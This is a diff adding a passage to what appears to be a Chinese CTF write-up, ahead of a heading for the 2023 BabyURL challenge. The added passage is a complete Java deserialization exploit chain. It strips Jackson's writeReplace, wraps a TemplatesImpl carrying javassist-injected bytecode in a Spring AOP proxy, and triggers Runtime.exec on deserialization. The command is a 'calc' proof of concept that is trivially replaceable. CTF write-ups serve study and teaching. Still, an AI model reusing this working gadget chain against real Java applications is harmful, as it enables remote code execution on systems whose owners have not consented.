@@ -90,6 +90,84 @@ public class Test {
 }
 ```
 
+稳定版本：https://xz.aliyun.com/t/12846
+
+```java
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import javassist.CtMethod;
+import org.springframework.aop.framework.AdvisedSupport;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+
+public class JSON {
+    public static void main(String[] args) throws Exception {
+        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
+        ctClass.removeMethod(writeReplace);
+        ctClass.toClass();
+        POJONode node = new POJONode(makeTemplatesImplAopProxy("calc"));
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        setFieldValue(val, "val", node);
+
+        serialize(val);
+    }
+
+    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static void serialize(Object o) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(o);
+        oos.close();
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
+        ois.readObject();
+    }
+
+    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(makeTemplatesImpl(cmd));
+        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
+        return proxy;
+    }
+
+    public static Object makeTemplatesImpl(String cmd) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass("a");
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
+        clazz.addConstructor(constructor);
+        byte[][] bytes = new byte[][]{clazz.toBytecode()};
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, "_bytecodes", bytes);
+        setFieldValue(templates, "_name", "test");
+        return templates;
+    }
+}
+```
+
 # 巅峰极客2023 BabyURL
 
 附件👉[Click Me](../backup/geek_BabyURL.zip)
